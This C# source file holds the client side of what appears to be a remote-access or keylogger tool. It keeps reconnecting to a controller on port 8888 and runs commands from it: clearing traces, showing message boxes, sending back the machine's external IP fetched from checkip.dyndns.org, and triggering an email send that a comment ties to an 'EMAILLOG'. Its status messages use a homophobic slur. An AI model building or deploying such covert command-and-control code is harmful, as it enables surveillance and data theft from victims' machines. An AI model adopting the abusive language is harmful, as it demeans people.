using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;
namespace ConsoleApplication1
{


    
    public class ClientThread
    {
	public enum Messages : byte{
		ping=0,
		sendData=1
	}
        public bool IsConnected()
        {

            IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] tcpConnections = ipProperties.GetActiveTcpConnections().Where(x => x.LocalEndPoint.Equals(client.Client.LocalEndPoint) && x.RemoteEndPoint.Equals(client.Client.RemoteEndPoint)).ToArray();

            if (tcpConnections != null && tcpConnections.Length > 0)
            {
                TcpState stateOfConnection = tcpConnections.First().State;
                if (stateOfConnection == TcpState.Established)
                {
                    // Connection is OK
                    return true;
                }
                else
                {
                    // No active tcp Connection to hostName:port
                    return false;
                }

            }
            else
            {
                return false;
            }
        }
        public async Task connect(string ip, int port,TcpClient client)
        {
            try
            {

                await client.ConnectAsync(ip, port);
		//WriteData(Encoding.ASCII.GetBytes("SENDDATA EMAILLOG 0"));
                Console.WriteLine("Oi oi, we connected faggot");
            }
            catch
            {
               //connect(ip, port, client);
            }
           
            
        }
        public static string ip = "127.0.0.1";
        public static int port = 8888;
        public TcpClient client=new TcpClient();
        public ClientThread()
        {
            
            Task.Run(() =>
            {
               StartConnectingAsync();
            });
            
        }
	public async Task StartConnectingAsync(){
              
                while (true)
                {
                    try
                    {
                        if (!IsConnected())
                        {
                            client = new TcpClient();
                            await connect(ip, port, client);
                        }
                        NetworkStream stream = client.GetStream();
                        
                            byte[] data = new Byte[100];
		   	    
                            if (stream.DataAvailable)
                            {
                                await stream.ReadAsync(data, 0, 100);
                                var str = System.Text.Encoding.Default.GetString(data);
                                console(str);
				//consoleByte(data);
                            }
                            stream.Flush();
                           
                        
                    }
                    catch
                    {
                        //connect(ip, port, client);
                    }
                }

	}
	public void consoleByte(byte[] data){
		switch(data[0]){
		case 0:
		WriteData(new byte[]{0});
		break;
		default:
		break;
		}
	}
        public void console(string str)
        {
            string[] command = str.Split(" ".ToCharArray());

            switch (command[0]) { 
                case "CLEARTRACE":
                    Program.ClearTrace();
                    break;

                case "SHOWMESSAGEBOX":
                    command[0] = "";
                    MessageBox.Show(String.Join(" ",command));
                    break;
                default:
                    if (command[0].Contains("CLEAR"))
                    {
                        Program.ClearTrace();
                        Console.WriteLine(command[0]);
                    }
                    else if (command[0].Contains("IP"))
                    {
                        string externalIP1 = "error";
                        try
                        {

                            externalIP1 = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                            externalIP1 = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))
                                .Matches(externalIP1)[0].ToString();

                        }
                        catch { }
                        WriteData(Encoding.ASCII.GetBytes(externalIP1));
                    }
                    else if (command[0].Contains("EMAIL"))
                    {
                        Program.SendEmail();
                        WriteData(Encoding.ASCII.GetBytes("Email Sent Faggot!"));
                    }
                    Console.WriteLine(str);
                  break;
            }
        }
        public void WriteData(byte[] data)
        {
            NetworkStream stream = client.GetStream();
            stream.Write(data, 0, data.Length);
        }
    }
}
